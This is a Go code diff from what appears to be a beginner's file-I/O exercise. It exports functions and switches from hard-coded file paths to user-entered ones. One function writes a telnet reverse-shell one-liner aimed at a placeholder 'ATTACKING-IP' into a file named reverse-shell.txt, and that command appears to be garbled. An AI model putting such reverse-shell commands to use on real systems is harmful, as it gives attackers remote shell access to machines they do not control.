@@ -1,4 +1,4 @@
-package main
+package fileManager
 
 import (
 	"bufio"
@@ -26,7 +26,7 @@ type Room struct {
 
 // a pointer is a variable that stores the location of a value in memory used especially in linked list
 
-func checkIfFileExist() {
+func CheckIfFileExist() {
 
 	x := House{
 		NoRooms: 1,
@@ -39,7 +39,9 @@ func checkIfFileExist() {
 
 	fmt.Printf("color of my room is : %s\n", x.Roomie.Color)
 
-	filePath := "hercury/Documents/nano.txt"
+	var filePath string
+	fmt.Print("enter file path, e.g(path/to/file): ")
+	fmt.Scanf("%s", &filePath)
 
 	_, err := os.Stat(filePath) // get file info
 
@@ -52,7 +54,7 @@ func checkIfFileExist() {
 	}
 }
 
-func writeToFile() {
+func WriteToFile() {
 	file, err := os.Create("reverse-shell.txt")
 	if err != nil {
 		log.Fatal(err)
@@ -68,15 +70,18 @@ func writeToFile() {
 	}
 	writer.Flush()
 	fmt.Println("Data succesfully written to file")
-
+	//using normal os write
 	file.Write([]byte("\n\nfor telnet:\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n"))
 	fmt.Println("Data succesfully written to file")
 }
 
-func checkFileSize() {
-	file, err := os.Stat("reverse-shell.txt")
+func CheckFileSize() {
+	var filepath string
+	fmt.Print("enter file path to check file size, e.g(path/to/file): ")
+	fmt.Scanf("%s", &filepath)
+	fileSize, err := os.Stat(filepath)
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Printf("specified file is %dbytes", file.Size())
+	fmt.Printf("%s is %d bytes", filepath, fileSize.Size())
 }
